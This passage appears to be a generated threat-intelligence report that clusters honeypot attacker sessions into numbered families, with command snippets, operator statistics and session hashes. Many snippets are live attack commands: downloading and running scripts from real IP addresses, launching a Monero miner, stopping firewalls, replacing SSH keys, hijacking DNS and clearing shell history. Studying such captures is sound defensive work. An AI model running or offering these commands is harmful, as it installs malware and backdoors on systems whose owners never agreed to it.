cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://bytefend.io/spooky.sh; chmod 777 *; sh spooky.sh; tftp -g bytefend.io -r spooky.sh; chmod 777 *; sh spooky.sh; rm -rf *.sh; history -c
```

Consensus (op, conn) pairs:

```python
[('cd', '||'), ('cd', '||'), ('cd', '||'), ('cd', '||'), ('cd', ';'), ('wget', ';'), ('chmod', ';'), ('sh', ';'), ('tftp', ';'), ('chmod', ';'), ('sh', ';'), ('rm', ';'), ('history', 'EOS')]
```

Top operators: [('cd', 10), ('chmod', 4), ('sh', 4), ('wget', 2), ('tftp', 2), ('rm', 2), ('history', 2)]

**Members (first 5):**

| fi_hash          | session      |   n_rows |
|:-----------------|:-------------|---------:|
| 32e217eef22aa399 | 4d1ffcf3630c |        1 |
| 82865ab70d22907f | 895d690d8da0 |        1 |

## Family 38

Size: **2**, mean_FS: **1.000**, sd_FS: **0.000**  
Medoid: `fi_hash=398d4423fa7636ec` (session `28eb8555c630`, n_rows=1)  

**Medoid commands (snippet):**

```bash
ifconfig
```

Consensus (op, conn) pairs:

```python
[('ifconfig', 'EOS')]
```

Top operators: [('ifconfig', 2)]

**Members (first 5):**

| fi_hash          | session      |   n_rows |
|:-----------------|:-------------|---------:|
| 398d4423fa7636ec | 28eb8555c630 |        1 |
| a6b523667cdf4611 | b7809d2fad30 |        1 |

## Family 85

Size: **2**, mean_FS: **1.000**, sd_FS: **0.000**  
Medoid: `fi_hash=60b70c116c5cfb9c` (session `fa98818da038`, n_rows=1)  

**Medoid commands (snippet):**

```bash
mkdir -p /tmp/criptonize/criptonize2 || mkdir -p /var/tmp/criptonize/criptonize2 || mkdir -p /dev/criptonize/criptonize2 || mkdir -p criptonize/criptonize2; cd /tmp/criptonize || cd /var/tmp/criptonize || cd /dev/criptonize || cd criptonize; ls -F; uname -a; p ...
```

Consensus (op, conn) pairs:

```python
[('mkdir', '||'), ('mkdir', '||'), ('mkdir', '||'), ('mkdir', ';'), ('cd', '||'), ('cd', '||'), ('cd', '||'), ('cd', ';'), ('ls', ';'), ('uname', ';'), ('python', '||'), ('python', '||'), ('PH_EXEC_1', '||'), ('python', '||'), ('python', '||'), ('PH_EXEC_2', '||'), ('python', '||'), ('python', '||'), ('PH_EXEC_3', '||'), ('python2.7', 'EOS')]
```

Top operators: [('python', 12), ('mkdir', 8), ('cd', 8), ('ls', 2), ('uname', 2), ('PH_EXEC_1', 2), ('PH_EXEC_2', 2), ('PH_EXEC_3', 2), ('python2.7', 2)]

**Members (first 5):**

| fi_hash          | session      |   n_rows |
|:-----------------|:-------------|---------:|
| 60b70c116c5cfb9c | fa98818da038 |        1 |
| 76fd3e014b746824 | cf3029c3b68c |        1 |

## Family 90

Size: **2**, mean_FS: **1.000**, sd_FS: **0.000**  
Medoid: `fi_hash=7b27b012389ba772` (session `52e30c5570b3`, n_rows=1)  

**Medoid commands (snippet):**

```bash
uname -a; nproc
```

Consensus (op, conn) pairs:

```python
[('uname', ';'), ('nproc', 'EOS')]
```

Top operators: [('uname', 2), ('nproc', 2)]

**Members (first 5):**

| fi_hash          | session      |   n_rows |
|:-----------------|:-------------|---------:|
| 7b27b012389ba772 | 52e30c5570b3 |        1 |
| fad866a677508be0 | 2324cbc2364e |        1 |

## Family 116

Size: **2**, mean_FS: **1.000**, sd_FS: **0.000**  
Medoid: `fi_hash=a01c4648adc39405` (session `ac1f4c081bd2`, n_rows=1)  

**Medoid commands (snippet):**

```bash
wget http://2.58.149.116/w -O- | sh; curl http://2.58.149.116/c | sh
```

Consensus (op, conn) pairs:

```python
[('wget', '|'), ('sh', ';'), ('curl', '|'), ('sh', 'EOS')]
```

Top operators: [('sh', 4), ('wget', 2), ('curl', 2)]

**Members (first 5):**

| fi_hash          | session      |   n_rows |
|:-----------------|:-------------|---------:|
| a01c4648adc39405 | ac1f4c081bd2 |        1 |
| e22c4a5898cf4290 | 39b1e617143e |        1 |

## Family 174

Size: **2**, mean_FS: **1.000**, sd_FS: **0.000**  
Medoid: `fi_hash=c93ca54e1eafb0be` (session `05253043eaf2`, n_rows=9)  

**Medoid commands (snippet):**

```bash
enable
system
shell
sh
linuxshell
cd /tmp/; echo "senpai" > rootsenpai; cat rootsenpai; rm -rf rootsenpai
rm -rf shr; wget http://46.23.109.47/shr || curl -O http://46.23.109.47/shr || tftp 46.23.109.47 -c get shr || tftp -g -r shr 46.23.109.47; chmod 777 shr; ...
```

Consensus (op, conn) pairs:

```python
[('enable', ';'), ('system', ';'), ('shell', ';'), ('sh', ';'), ('linuxshell', ';'), ('cd', ';'), ('echo', ';'), ('cat', ';'), ('rm', ';'), ('rm', ';'), ('wget', '||'), ('curl', '||'), ('tftp', '||'), ('tftp', ';'), ('chmod', ';'), ('PH_EXEC_1', ';'), ('rm', ';'), ('rm', ';'), ('rm', ';'), ('cat', '||'), ('read', ';'), ('echo', 'EOS')]
```

Top operators: [('rm', 10), ('echo', 4), ('cat', 4), ('tftp', 4), ('enable', 2), ('system', 2), ('shell', 2), ('sh', 2), ('linuxshell', 2), ('cd', 2)]

**Members (first 5):**

| fi_hash          | session      |   n_rows |
|:-----------------|:-------------|---------:|
| c93ca54e1eafb0be | 05253043eaf2 |        9 |
| c98d37f36c41528e | 94b6e5139f0f |        9 |

## Family 84

Size: **2**, mean_FS: **0.938**, sd_FS: **0.000**  
Medoid: `fi_hash=0ac031a8c7b735bc` (session `0021a3084943`, n_rows=6)  

**Medoid commands (snippet):**

```bash
cat /bin/echo
cat /proc/mounts
echo -e '\\x72\\x70\\x70\\x72/dev' > /dev/.dabag; cat /dev/.dabag; rm /dev/.dabag
echo -e '\\x4d\\x4f\\x55\\x4e\\x54\\x53\\x5f\\x44\\x4f\\x4e\\x45'
wget --help>/dev/null && echo -en '\\x57\\x47\\x45\\x54'; curl --help>/dev/null & ...
```

Consensus (op, conn) pairs:

```python
[('cat', ';'), ('echo', ';'), ('cat', ';'), ('rm', ';'), ('echo', ';'), ('wget', '&&'), ('echo', ';'), ('curl', '&&'), ('echo', ';'), ('echo', ';'), ('cd', ';'), ('wget', ';'), ('PH_EXEC_1', ';'), ('>', ';'), ('echo', 'EOS')]
```

Top operators: [('echo', 12), ('cat', 5), ('wget', 4), ('rm', 2), ('curl', 2), ('cd', 2), ('PH_EXEC_1', 2), ('>', 2)]

**Members (first 5):**

| fi_hash          | session      |   n_rows |
|:-----------------|:-------------|---------:|
| 0ac031a8c7b735bc | 0021a3084943 |        6 |
| dba3875dfe5478c8 | 104907cfb66e |        5 |

## Family 86

Size: **2**, mean_FS: **0.936**, sd_FS: **0.000**  
Medoid: `fi_hash=6559ebbe3ca35ec7` (session `9fd4317b3b1e`, n_rows=11)  

**Medoid commands (snippet):**

```bash
>/tmp/.l && cd /tmp/; echo -en '\\x50\\x41\\x54\\x48\\x5f\\x44\\x4f\\x4e\\x45' || ./helloworld
>/var/.l && cd /var/; echo -en '\\x50\\x41\\x54\\x48\\x5f\\x44\\x4f\\x4e\\x45' || ./helloworld
>/dev/.l && cd /dev/; echo -en '\\x50\\x41\\x54\\x48\\x5f\\x44\\x4f\\x ...
```

Consensus (op, conn) pairs:

```python
[('>', '&&'), ('cd', ';'), ('echo', '||'), ('PH_EXEC_1', ';'), ('>', '&&'), ('cd', ';'), ('echo', '||'), ('PH_EXEC_1', ';'), ('>', '&&'), ('cd', ';'), ('echo', '||'), ('PH_EXEC_1', ';'), ('>', '&&'), ('cd', ';'), ('echo', '||'), ('PH_EXEC_1', ';'), ('>', '&&'), ('cd', ';'), ('echo', '||'), ('PH_EXEC_1', ';'), ('>', '&&'), ('cd', ';'), ('echo', '||'), ('PH_EXEC_1', ';'), ('>', '&&'), ('cd', ';'), ('echo', '||'), ('PH_EXEC_1', ';'), ('>', '&&'), ('cd', ';'), ('echo', '||'), ('PH_EXEC_1', ';'), ('>', '&&'), ('cd', ';'), ('echo', '||'), ('PH_EXEC_1', ';'), ('>', '&&'), ('cd', ';'), ('echo', '||'), ('PH_EXEC_1', ';'), ('>', '&&'), ('cd', ';'), ('echo', '||')]
```

Top operators: [('>', 22), ('cd', 22), ('echo', 22), ('PH_EXEC_1', 22), ('wget', 1), ('chmod', 1), ('PH_EXEC_2', 1)]

**Members (first 5):**

| fi_hash          | session      |   n_rows |
|:-----------------|:-------------|---------:|
| 6559ebbe3ca35ec7 | 9fd4317b3b1e |       11 |
| 7e72b2f790f46dda | a24cf45bebf1 |       12 |

## Family 59

Size: **2**, mean_FS: **0.909**, sd_FS: **0.000**  
Medoid: `fi_hash=20c68e56c7295b40` (session `a967d725f86c`, n_rows=4)  

**Medoid commands (snippet):**

```bash
cat /proc/mounts
echo -e '\\x72\\x70\\x70\\x72/dev' > /dev/.dabag; cat /dev/.dabag; rm /dev/.dabag
echo -e '\\x4d\\x4f\\x55\\x4e\\x54\\x53\\x5f\\x44\\x4f\\x4e\\x45'
wget --help>/dev/null && echo -en '\\x57\\x47\\x45\\x54'; curl --help>/dev/null && echo -en '\\ ...
```

Consensus (op, conn) pairs:

```python
[('cat', ';'), ('echo', ';'), ('cat', ';'), ('rm', ';'), ('echo', ';'), ('wget', '&&'), ('echo', ';'), ('curl', '&&'), ('echo', ';'), ('echo', 'EOS')]
```

Top operators: [('echo', 10), ('cat', 5), ('rm', 2), ('wget', 2), ('curl', 2)]

**Members (first 5):**

| fi_hash          | session      |   n_rows |
|:-----------------|:-------------|---------:|
| 20c68e56c7295b40 | a967d725f86c |        4 |
| 25880dfb8f6dc9d5 | 04310ea49667 |        5 |

## Family 43

Size: **2**, mean_FS: **0.904**, sd_FS: **0.000**  
Medoid: `fi_hash=02bf42b5f10bf742` (session `69db926faa9d`, n_rows=5)  

**Medoid commands (snippet):**

```bash
mkdir /var/; mount -o remount, rw /var/; cp /bin/echo /var/.z && >/var/.z && cd /var/; rm -rf .i; cp .z .i; cp .i .d; chmod 777 .i; chmod 777 .d
mkdir /etc/; mount -o remount, rw /etc/; cp /bin/echo /etc/.z && >/etc/.z && cd /etc/; rm -rf .i; cp .z .i; cp .i . ...
```

Consensus (op, conn) pairs:

```python
[('mkdir', ';'), ('mount', ';'), ('cp', '&&'), ('>', '&&'), ('cd', ';'), ('rm', ';'), ('cp', ';'), ('cp', ';'), ('chmod', ';'), ('chmod', ';'), ('mkdir', ';'), ('mount', ';'), ('cp', '&&'), ('>', '&&'), ('cd', ';'), ('rm', ';'), ('cp', ';'), ('cp', ';'), ('chmod', ';'), ('chmod', ';'), ('mkdir', ';'), ('mount', ';'), ('cp', '&&'), ('>', '&&'), ('cd', ';'), ('rm', ';'), ('cp', ';'), ('cp', ';'), ('chmod', ';'), ('chmod', ';'), ('mkdir', ';'), ('mount', ';'), ('cp', '&&'), ('>', '&&'), ('cd', ';'), ('rm', ';'), ('cp', ';'), ('cp', ';'), ('chmod', ';'), ('chmod', ';'), ('wget', '||'), ('busybox', '||'), ('wd1', ';'), ('curl', '||'), ('busybox', '||'), ('cd1', ';')]
```

Top operators: [('cp', 24), ('chmod', 16), ('>', 9), ('mkdir', 8), ('mount', 8), ('cd', 8), ('rm', 8), ('busybox', 5), ('wget', 3), ('wd1', 3)]

**Members (first 5):**

| fi_hash          | session      |   n_rows |
|:-----------------|:-------------|---------:|
| 02bf42b5f10bf742 | 69db926faa9d |        5 |
| 45fd505207c92a4e | 0b98cd8821f2 |        6 |

## Family 132

Size: **2**, mean_FS: **0.889**, sd_FS: **0.000**  
Medoid: `fi_hash=6d8c0af57577bc05` (session `8fc1eb9e7d80`, n_rows=4)  

**Medoid commands (snippet):**

```bash
echo -e '\\x79\\x65\\x73\\x68\\x65\\x6c\\x6f'
cat /bin/echo
cat /proc/mounts
rm //.f; cp $SHELL //.f && >//.f && echo -e '\\x67\\x6f\\x6f\\x64\\x77\\x72\\x69\\x74\\x65' && chmod 777 //.f; echo -e '\\x63\\x6d\\x64\\x67\\x6f\\x74'
```

Consensus (op, conn) pairs:

```python
[('echo', ';'), ('cat', ';'), ('cat', ';'), ('cp', '&&'), ('>', '&&'), ('echo', '&&'), ('chmod', ';'), ('echo', 'EOS')]
```

Top operators: [('echo', 6), ('cat', 4), ('cp', 2), ('>', 2), ('chmod', 2), ('rm', 1)]

**Members (first 5):**

| fi_hash          | session      |   n_rows |
|:-----------------|:-------------|---------:|
| 6d8c0af57577bc05 | 8fc1eb9e7d80 |        4 |
| 83be9cce53639c71 | 585276e0bb4d |        4 |

## Family 40

Size: **2**, mean_FS: **0.875**, sd_FS: **0.000**  
Medoid: `fi_hash=0ec09df9c267b5e2` (session `0477bca0db78`, n_rows=1)  

**Medoid commands (snippet):**

```bash
cd /tmp; wget 164.92.142.65/irc.pl; perl irc.pl; rm -rf irc.pl; curl -O 164.92.142.65/irc.pl; perl irc.pl; rm -rf irc.pl; history -c
```

Consensus (op, conn) pairs:

```python
[('cd', ';'), ('wget', ';'), ('rm', ';'), ('curl', ';'), ('rm', ';'), ('history', 'EOS')]
```

Top operators: [('rm', 4), ('cd', 2), ('wget', 2), ('perl', 2), ('curl', 2), ('history', 2), ('sh', 2)]

**Members (first 5):**

| fi_hash          | session      |   n_rows |
|:-----------------|:-------------|---------:|
| 0ec09df9c267b5e2 | 0477bca0db78 |        1 |
| f99a1c7cba0a5e2c | 050f875c144b |        1 |

## Family 57

Size: **2**, mean_FS: **0.875**, sd_FS: **0.000**  
Medoid: `fi_hash=451533492c3eede8` (session `020206bcba40`, n_rows=1)  

**Medoid commands (snippet):**

```bash
wget http://45.90.161.105/systemd && chmod +x * && ./systemd -o de.minexmr.com:443 -B -u 8BHQUunQHax1XjPonUxPKk1H4EKP6SdXnMtyyY5W9Bts7qM7uq5XsjjXiPj1zacMGP8chCv4cumYZRYfH5cUBGshKy1gssW -k --tls --rig-id Main && rm -rf *
```

Consensus (op, conn) pairs:

```python
[('chmod', '&&'), ('PH_EXEC_1', '&&'), ('rm', 'EOS')]
```

Top operators: [('chmod', 2), ('PH_EXEC_1', 2), ('rm', 2), ('wget', 1), ('curl', 1)]

**Members (first 5):**

| fi_hash          | session      |   n_rows |
|:-----------------|:-------------|---------:|
| 451533492c3eede8 | 020206bcba40 |        1 |
| b028e56f126568d0 | acb75ef9db7d |        1 |

## Family 60

Size: **2**, mean_FS: **0.875**, sd_FS: **0.000**  
Medoid: `fi_hash=aca4e45d351775c8` (session `d764d0438cc3`, n_rows=1)  

**Medoid commands (snippet):**

```bash
/etc/init.d/iptables stop; service iptables stop; SuSEfirewall2 stop; reSuSEfirewall2 stop; wget -c http://82.157.25.133/dos64; chmod 777 dos64; ./dos64
```

Consensus (op, conn) pairs:

```python
[('PH_EXEC_1', ';'), ('systemctl', ';'), ('SuSEfirewall2', ';'), ('reSuSEfirewall2', ';'), ('wget', ';'), ('chmod', ';'), ('PH_EXEC_2', 'EOS')]
```

Top operators: [('wget', 3), ('PH_EXEC_1', 2), ('systemctl', 2), ('SuSEfirewall2', 2), ('reSuSEfirewall2', 2), ('chmod', 2), ('PH_EXEC_2', 2)]

**Members (first 5):**

| fi_hash          | session      |   n_rows |
|:-----------------|:-------------|---------:|
| aca4e45d351775c8 | d764d0438cc3 |        1 |
| e9f0cbe7e07000a2 | b45f9e704f5c |        1 |

## Family 29

Size: **2**, mean_FS: **0.857**, sd_FS: **0.000**  
Medoid: `fi_hash=3a02e64a0ed4f604` (session `2aa70fc529f6`, n_rows=2)  

**Medoid commands (snippet):**

```bash
echo -e '\\x67\\x61\\x79\\x66\\x67\\x74'
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQC/yU0iqklqw6etPlUon4mZzxslFWq8G8sRyluQMD3i8tpQWT2cX/mwGgSRCz7HMLyxt87olYIPemTIRBiyqk8SLD3ijQpfZwQ9vsHc47hdTBfj89FeHJGGm1KpWg8lrXeMW+5jIXTF ...
```

Consensus (op, conn) pairs:

```python
[('cd', '&&'), ('rm', '&&'), ('mkdir', '&&'), ('echo', '&&'), ('chmod', '&&'), ('cd', 'EOS')]
```

Top operators: [('cd', 4), ('echo', 3), ('rm', 2), ('mkdir', 2), ('chmod', 2)]

**Members (first 5):**

| fi_hash          | session      |   n_rows |
|:-----------------|:-------------|---------:|
| 3a02e64a0ed4f604 | 2aa70fc529f6 |        2 |
| a27cb9e158e0768e | 07b2077e6456 |        1 |

## Family 39

Size: **2**, mean_FS: **0.857**, sd_FS: **0.000**  
Medoid: `fi_hash=9c07a2ac9b0db760` (session `00031aeff1a6`, n_rows=5)  

**Medoid commands (snippet):**

```bash
sh
shell
enable
echo 'nameserver 95.214.27.202'>/etc/resolv.conf
cat /bin/echo || while read i; do echo $i; done < /proc/self/exe
```

Consensus (op, conn) pairs:

```python
[('sh', ';'), ('shell', ';'), ('enable', ';'), ('cat', '||'), ('read', ';'), ('echo', 'EOS')]
```

Top operators: [('echo', 3), ('sh', 2), ('shell', 2), ('enable', 2), ('cat', 2), ('read', 2)]

**Members (first 5):**

| fi_hash          | session      |   n_rows |
|:-----------------|:-------------|---------:|
| 9c07a2ac9b0db760 | 00031aeff1a6 |        5 |
| ec2785b8610be5a7 | 0003f10a2103 |        4 |

## Family 49

Size: **2**, mean_FS: **0.853**, sd_FS: **0.000**  
Medoid: `fi_hash=67e53703cd2c4c9b` (session `8b138d9b23fa`, n_rows=7)  

**Medoid commands (snippet):**

```bash
sh
shell
enable
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQC/yU0iqklqw6etPlUon4mZzxslFWq8G8sRyluQMD3i8tpQWT2cX/mwGgSRCz7HMLyxt87olYIPemTIRBiyqk8SLD3ijQpfZwQ9vsHc47hdTBfj89FeHJGGm1KpWg8lrXeMW+5jIXTFmEFhbJ18wc25Dcds4QCM0DvZG ...
```

Consensus (op, conn) pairs:

```python
[('sh', ';'), ('shell', ';'), ('enable', ';'), ('cd', '&&'), ('rm', '&&'), ('mkdir', '&&'), ('echo', '&&'), ('chmod', '&&'), ('cd', ';'), ('mkdir', ';'), ('mount', ';'), ('cp', '&&'), ('>', '&&'), ('cd', ';'), ('rm', ';'), ('cp', ';'), ('cp', ';'), ('chmod', ';'), ('chmod', ';'), ('mkdir', ';'), ('mount', ';'), ('cp', '&&'), ('>', '&&'), ('cd', ';'), ('rm', ';'), ('cp', ';'), ('cp', ';'), ('chmod', ';')]
```

Top operators: [('cp', 12), ('chmod', 10), ('cd', 8), ('rm', 6), ('mkdir', 6), ('>', 5), ('mount', 4), ('sh', 2), ('shell', 2), ('enable', 2)]

**Members (first 5):**

| fi_hash          | session      |   n_rows |
|:-----------------|:-------------|---------:|
| 67e53703cd2c4c9b | 8b138d9b23fa |        7 |
| b2477f3961face4d | 0ce49c1851cb |        6 |

## Family 54

Size: **2**, mean_FS: **0.846**, sd_FS: **0.000**  
Medoid: `fi_hash=0b5d50b60be6ee9b` (session `00868542c976`, n_rows=5)  

**Medoid commands (snippet):**

```bash
cat /bin/echo
cat /proc/mounts
echo -e '\\x72\\x70\\x70\\x72/dev' > /dev/.dabag; cat /dev/.dabag; rm /dev/.dabag
echo -e '\\x4d\\x4f\\x55\\x4e\\x54\\x53\\x5f\\x44\\x4f\\x4e\\x45'
rm -f /dev/.d; rm -f /dev/.f; >/dev/.d; (chmod 777 /dev/.d || cp /bin/echo /dev/. ...
```

Consensus (op, conn) pairs:

```python
[('echo', ';'), ('cat', ';'), ('rm', ';'), ('echo', ';'), ('rm', ';'), ('rm', ';'), ('>', ';'), ('chmod', '||'), ('cp', ';'), ('>', ';'), ('cp', 'EOS')]
```

Top operators: [('rm', 6), ('cat', 4), ('echo', 4), ('>', 4), ('cp', 4), ('chmod', 2)]

**Members (first 5):**

| fi_hash          | session      |   n_rows |
|:-----------------|:-------------|---------:|
| 0b5d50b60be6ee9b | 00868542c976 |        5 |
| 831555f4931b656b | 669b17681d03 |        3 |

## Family 22

Size: **2**, mean_FS: **0.844**, sd_FS: **0.000**  
Medoid: `fi_hash=5d53142e1623d1e3` (session `17345c279d8c`, n_rows=4)  

**Medoid commands (snippet):**

```bash
mkdir /dev/shm/; mount -o remount, rw /dev/shm/; cp /bin/echo /dev/shm/.z && >/dev/shm/.z && cd /dev/shm/; rm -rf .i; cp .z .i; cp .i .d; chmod 777 .i; chmod 777 .d
mkdir /mnt/; mount -o remount, rw /mnt/; cp /bin/echo /mnt/.z && >/mnt/.z && cd /mnt/; rm -rf . ...
```

Consensus (op, conn) pairs:

```python
[('mkdir', ';'), ('mount', ';'), ('cp', '&&'), ('>', '&&'), ('cd', ';'), ('rm', ';'), ('cp', ';'), ('cp', ';'), ('chmod', ';'), ('chmod', ';'), ('mkdir', ';'), ('mount', ';'), ('cp', '&&'), ('>', '&&'), ('cd', ';'), ('rm', ';'), ('cp', ';'), ('cp', ';'), ('chmod', ';'), ('chmod', ';'), ('wget', '||'), ('busybox', '||'), ('wd1', ';'), ('curl', '||'), ('busybox', '||'), ('cd1', ';')]
```

Top operators: [('cp', 12), ('chmod', 8), ('>', 5), ('busybox', 5), ('mkdir', 4), ('mount', 4), ('cd', 4), ('rm', 4), ('wget', 3), ('wd1', 3)]

**Members (first 5):**

| fi_hash          | session      |   n_rows |
|:-----------------|:-------------|---------:|
| 5d53142e1623d1e3 | 17345c279d8c |        4 |
| afdd2c65acb8f302 | 02b885bb0916 |        3 |

## Family 62

Size: **2**, mean_FS: **0.833**, sd_FS: **0.000**  
Medoid: `fi_hash=29c083ae2c506320` (session `06266de0acb2`, n_rows=2)  

**Medoid commands (snippet):**

```bash
cat /bin/echo
cd /tmp; wget http://95.214.27.202/x86 -O- >.f; ./.f ssh.wget.x86; >.f; echo rppr
```

Consensus (op, conn) pairs:

```python
[('cd', ';'), ('wget', ';'), ('PH_EXEC_1', ';'), ('>', ';'), ('echo', 'EOS')]
```

Top operators: [('cd', 2), ('wget', 2), ('PH_EXEC_1', 2), ('>', 2), ('echo', 2), ('cat', 1)]

**Members (first 5):**

| fi_hash          | session      |   n_rows |
|:-----------------|:-------------|---------:|
| 29c083ae2c506320 | 06266de0acb2 |        2 |
| 4833c2b6eebe737d | 17aa8d305d53 |        1 |

## Family 23

Size: **2**, mean_FS: **0.833**, sd_FS: **0.000**  
Medoid: `fi_hash=302b118aba41af49` (session `17786e44b68b`, n_rows=1)  

**Medoid commands (snippet):**

```bash
wget http://207.167.64.59/test.sh; sh test.sh; history -c
```

Consensus (op, conn) pairs:

```python
[('wget', ';'), ('sh', ';')]
```

Top operators: [('wget', 2), ('sh', 2), ('history', 1), ('rm', 1)]

**Members (first 5):**

| fi_hash          | session      |   n_rows |
|:-----------------|:-------------|---------:|
| 302b118aba41af49 | 17786e44b68b |        1 |
| 8d0d7227df5d030d | 458d8621893e |        1 |

## Family 26

Size: **2**, mean_FS: **0.833**, sd_FS: **0.000**  
Medoid: `fi_hash=35abe32a1336597c` (session `43d884f1191a`, n_rows=6)  

**Medoid commands (snippet):**

```bash
>/tmp/.l && cd /tmp/; echo -en '\\x50\\x41\\x54\\x48\\x5f\\x44\\x4f\\x4e\\x45' || ./helloworld
>/var/.l && cd /var/; echo -en '\\x50\\x41\\x54\\x48\\x5f\\x44\\x4f\\x4e\\x45' || ./helloworld
>/dev/.l && cd /dev/; echo -en '\\x50\\x41\\x54\\x48\\x5f\\x44\\x4f\\x ...
```

Consensus (op, conn) pairs:

```python
[('>', '&&'), ('cd', ';'), ('echo', '||'), ('PH_EXEC_1', ';'), ('>', '&&'), ('cd', ';'), ('echo', '||'), ('PH_EXEC_1', ';'), ('>', '&&'), ('cd', ';'), ('echo', '||'), ('PH_EXEC_1', ';'), ('>', '&&'), ('cd', ';'), ('echo', '||'), ('PH_EXEC_1', ';'), ('>', '&&'), ('cd', ';'), ('echo', '||'), ('PH_EXEC_1', 'EOS')]
```

Top operators: [('>', 11), ('cd', 11), ('echo', 11), ('PH_EXEC_1', 11)]

**Members (first 5):**

| fi_hash          | session      |   n_rows |
|:-----------------|:-------------|---------:|
| 35abe32a1336597c | 43d884f1191a |        6 |
| f6b59773f41ad8e7 | 6014c562a732 |        5 |

## Family 64

Size: **2**, mean_FS: **0.833**, sd_FS: **0.000**  
Medoid: `fi_hash=803f189668db26ce` (session `1c7b394f56fd`, n_rows=3)  

**Medoid commands (snippet):**

```bash
cat /etc/resolv.conf
echo 'nameserver 79.137.248.21' > /etc/resolv.conf
echo 'nameserver 8.8.8.8' >> /etc/resolv.conf
```

Consensus (op, conn) pairs:

```python
[('echo', ';'), ('echo', 'EOS')]
```

Top operators: [('echo', 5), ('cat', 1)]

**Members (first 5):**

| fi_hash          | session      |   n_rows |
|:-----------------|:-------------|---------:|
| 803f189668db26ce | 1c7b394f56fd |        3 |
| f6df56b982b96e1e | 621bd184f66b |        3 |

## Family 33

Size: **2**, mean_FS: **0.833**, sd_FS: **0.000**  
Medoid: `fi_hash=9d3954c1d9a24fe0` (session `049094ef62b2`, n_rows=5)  

**Medoid commands (snippet):**

```bash
wget -qO - http://61.177.137.133/x/1sh | sh > /dev/null 2>&1 &
rm -rf /var/run/1sh; wget -c http://61.177.137.133/x/1sh -P /var/run && sh /var/run/1sh &
wget -qO - http://61.177.137.133/x/2sh | sh > /dev/null 2>&1 &
rm -rf /tmp/2sh; wget -c http://61.177.137.1 ...
```

Consensus (op, conn) pairs:

```python
[('wget', '|'), ('sh', ';'), ('rm', ';'), ('wget', '&&'), ('sh', ';'), ('wget', '|'), ('sh', ';'), ('rm', ';'), ('wget', '&&'), ('sh', 'EOS')]
```

Top operators: [('sh', 9), ('wget', 8), ('rm', 4), ('curl', 1)]

**Members (first 5):**

| fi_hash          | session      |   n_rows |
|:-----------------|:-------------|---------:|
| 9d3954c1d9a24fe0 | 049094ef62b2 |        5 |
| f6fae5c4cf83e303 | 28b882e68038 |        4 |

## Family 52

Size: **2**, mean_FS: **0.833**, sd_FS: **0.000**  
Medoid: `fi_hash=a360699b5640cf35` (session `004afd2e4660`, n_rows=3)  

**Medoid commands (snippet):**

```bash
ifconfig
uname -a
cat /proc/cpuinfo
```

Consensus (op, conn) pairs:

```python
[('ifconfig', ';'), ('uname', ';')]
```

Top operators: [('ifconfig', 2), ('uname', 2), ('cat', 1), ('ls', 1)]

**Members (first 5):**

| fi_hash          | session      |   n_rows |
|:-----------------|:-------------|---------:|
| a360699b5640cf35 | 004afd2e4660 |        3 |
| db32cfd676439ab5 | e780763f1358 |        3 |

## Family 17

Size: **2**, mean_FS: **0.833**, sd_FS: **0.000**  
Medoid: `fi_hash=e44d1ac3da0769c2` (session `5fa9ac23bf26`, n_rows=3)  

**Medoid commands (snippet):**

```bash
uname -rms
w
id
```

Consensus (op, conn) pairs:

```python
[('uname', ';'), ('id', 'EOS')]
```

Top operators: [('uname', 2), ('id', 2), ('w', 1), ('cat', 1)]

**Members (first 5):**

| fi_hash          | session      |   n_rows |
|:-----------------|:-------------|---------:|
| e44d1ac3da0769c2 | 5fa9ac23bf26 |        3 |
| ebd5deffc91a91ef | 73e0de14c782 |        3 |

## Family 25

Size: **2**, mean_FS: **0.828**, sd_FS: **0.000**  
Medoid: `fi_hash=aa67603da30b22bf` (session `0b4007a44b64`, n_rows=7)  

**Medoid commands (snippet):**

```bash
mkdir /dev/; mount -o remount, rw /dev/; cp /bin/echo /dev/.z && >/dev/.z && cd /dev/; rm -rf .i; cp .z .i; cp .i .d; chmod 777 .i; chmod 777 .d
mkdir /var/; mount -o remount, rw /var/; cp /bin/echo /var/.z && >/var/.z && cd /var/; rm -rf .i; cp .z .i; cp .i . ...
```

Consensus (op, conn) pairs:

```python
[('mkdir', ';'), ('mount', ';'), ('cp', '&&'), ('>', '&&'), ('cd', ';'), ('rm', ';'), ('cp', ';'), ('cp', ';'), ('chmod', ';'), ('chmod', ';'), ('mkdir', ';'), ('mount', ';'), ('cp', '&&'), ('>', '&&'), ('cd', ';'), ('rm', ';'), ('cp', ';'), ('cp', ';'), ('chmod', ';'), ('chmod', ';'), ('mkdir', ';'), ('mount', ';'), ('cp', '&&'), ('>', '&&'), ('cd', ';'), ('rm', ';'), ('cp', ';'), ('cp', ';'), ('chmod', ';'), ('chmod', ';'), ('mkdir', ';'), ('mount', ';'), ('cp', '&&'), ('>', '&&'), ('cd', ';'), ('rm', ';'), ('cp', ';'), ('cp', ';'), ('chmod', ';'), ('chmod', ';'), ('mkdir', ';'), ('mount', ';'), ('cp', '&&'), ('>', '&&'), ('cd', ';'), ('rm', ';'), ('cp', ';'), ('cp', ';'), ('chmod', ';'), ('chmod', ';'), ('wget', '||'), ('busybox', '||'), ('wd1', ';'), ('curl', '||'), ('busybox', '||'), ('cd1', ';')]
```

Top operators: [('cp', 33), ('chmod', 22), ('>', 12), ('mkdir', 11), ('mount', 11), ('cd', 11), ('rm', 11), ('busybox', 5), ('wget', 3), ('wd1', 3)]

**Members (first 5):**

| fi_hash          | session      |   n_rows |
|:-----------------|:-------------|---------:|
| aa67603da30b22bf | 0b4007a44b64 |        7 |
| ef096336f97b150c | ca0d0afe3de5 |        7 |

## Family 9

Size: **2**, mean_FS: **0.818**, sd_FS: **0.000**  
Medoid: `fi_hash=20bd857572ccd532` (session `122cb847c653`, n_rows=17)  

**Medoid commands (snippet):**

```bash
cat /proc/cpuinfo | grep name | wc -l
echo -e "admin\\nwrOXwuxUxHd8\\nwrOXwuxUxHd8" | passwd | bash
echo "admin\\nwrOXwuxUxHd8\\nwrOXwuxUxHd8\\n" | passwd
cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9; }'
free -m | grep Mem | awk '{ ...
```

Consensus (op, conn) pairs:

```python
